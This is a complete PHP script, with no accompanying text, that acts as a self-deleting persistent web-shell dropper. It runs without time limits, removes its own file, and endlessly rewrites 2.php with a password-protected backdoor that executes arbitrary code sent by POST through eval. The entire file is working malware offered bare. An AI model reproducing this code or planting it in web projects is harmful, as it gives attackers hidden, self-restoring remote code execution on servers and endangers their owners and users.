<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '2.php';
$code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
while (1){
    file_put_contents($file,$code);
    usleep(500);
}
?>